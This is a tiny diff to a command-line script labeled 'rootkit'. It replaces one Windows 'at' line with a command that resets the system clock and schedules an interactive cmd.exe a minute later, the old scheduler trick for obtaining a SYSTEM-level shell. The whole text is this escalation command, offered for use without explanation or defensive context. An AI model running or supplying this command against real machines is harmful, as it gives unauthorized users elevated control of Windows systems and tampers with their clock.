@@ -1,2 +1,4 @@
 #rootkit commandline based 
-at %TIME% /interactive "cmd.exe"
+#at %TIME% /interactive "cmd.exe"
+
+time 11 & at 11:01 /interactive "cmd.exe"
